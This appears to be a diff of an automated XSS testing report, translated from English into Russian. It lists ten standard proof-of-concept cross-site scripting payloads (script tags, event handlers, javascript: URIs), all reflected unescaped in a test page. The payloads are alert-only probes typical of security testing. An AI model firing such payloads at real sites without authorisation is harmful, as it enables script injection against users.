@@ -1,14 +1,13 @@
-XSS Vulnerability Testing Report
+Отчет о тестировании XSS-атаки
 ========================================
-Testing Date: 2024-12-06 14:14:14
-Total Tests Conducted: 10
-Total Vulnerabilities Found: 10
+Дата проверки: 2024-12-06 19:58:36
+Всего проведено тестов: 10
+Всего найдено уязвимостей: 10
 
-Detailed Vulnerability Information:
+Подробная информация об уязвимости:
 ----------------------------------------
-Payload: <script>alert('XSS')</script>
-Status Code: 200
-Response Snippet: 
+Полезная нагрузка: <script>alert('XSS')</script>
+Фрагмент ответа: 
     <html>
         <body>
             <h1>Ваш ввод:</h1>
@@ -17,9 +16,8 @@ Response Snippet:
     </html>
     
 ----------------------------------------
-Payload: <img src=x onerror=alert('XSS')>
-Status Code: 200
-Response Snippet: 
+Полезная нагрузка: <img src=x onerror=alert('XSS')>
+Фрагмент ответа: 
     <html>
         <body>
             <h1>Ваш ввод:</h1>
@@ -28,9 +26,8 @@ Response Snippet:
     </html>
     
 ----------------------------------------
-Payload: <svg/onload=alert('XSS')>
-Status Code: 200
-Response Snippet: 
+Полезная нагрузка: <svg/onload=alert('XSS')>
+Фрагмент ответа: 
     <html>
         <body>
             <h1>Ваш ввод:</h1>
@@ -39,9 +36,8 @@ Response Snippet:
     </html>
     
 ----------------------------------------
-Payload: <iframe src='javascript:alert(`XSS`);'></iframe>
-Status Code: 200
-Response Snippet: 
+Полезная нагрузка: <iframe src='javascript:alert(`XSS`);'></iframe>
+Фрагмент ответа: 
     <html>
         <body>
             <h1>Ваш ввод:</h1>
@@ -50,9 +46,8 @@ Response Snippet:
     </html>
     
 ----------------------------------------
-Payload: javascript:alert('XSS')
-Status Code: 200
-Response Snippet: 
+Полезная нагрузка: javascript:alert('XSS')
+Фрагмент ответа: 
     <html>
         <body>
             <h1>Ваш ввод:</h1>
@@ -61,9 +56,8 @@ Response Snippet:
     </html>
     
 ----------------------------------------
-Payload: <body onload=alert('XSS')>
-Status Code: 200
-Response Snippet: 
+Полезная нагрузка: <body onload=alert('XSS')>
+Фрагмент ответа: 
     <html>
         <body>
             <h1>Ваш ввод:</h1>
@@ -72,9 +66,8 @@ Response Snippet:
     </html>
     
 ----------------------------------------
-Payload: '"><script>alert('XSS')</script>
-Status Code: 200
-Response Snippet: 
+Полезная нагрузка: '"><script>alert('XSS')</script>
+Фрагмент ответа: 
     <html>
         <body>
             <h1>Ваш ввод:</h1>
@@ -83,9 +76,8 @@ Response Snippet:
     </html>
     
 ----------------------------------------
-Payload: ><script>alert(1)</script>
-Status Code: 200
-Response Snippet: 
+Полезная нагрузка: ><script>alert(1)</script>
+Фрагмент ответа: 
     <html>
         <body>
             <h1>Ваш ввод:</h1>
@@ -94,9 +86,8 @@ Response Snippet:
     </html>
     
 ----------------------------------------
-Payload: <marquee onstart=alert('XSS')>XSS</marquee>
-Status Code: 200
-Response Snippet: 
+Полезная нагрузка: <marquee onstart=alert('XSS')>XSS</marquee>
+Фрагмент ответа: 
     <html>
         <body>
             <h1>Ваш ввод:</h1>
@@ -105,9 +96,8 @@ Response Snippet:
     </html>
     
 ----------------------------------------
-Payload: <a href='javascript:alert(1)'>Click</a>
-Status Code: 200
-Response Snippet: 
+Полезная нагрузка: <a href='javascript:alert(1)'>Click</a>
+Фрагмент ответа: 
     <html>
         <body>
             <h1>Ваш ввод:</h1>
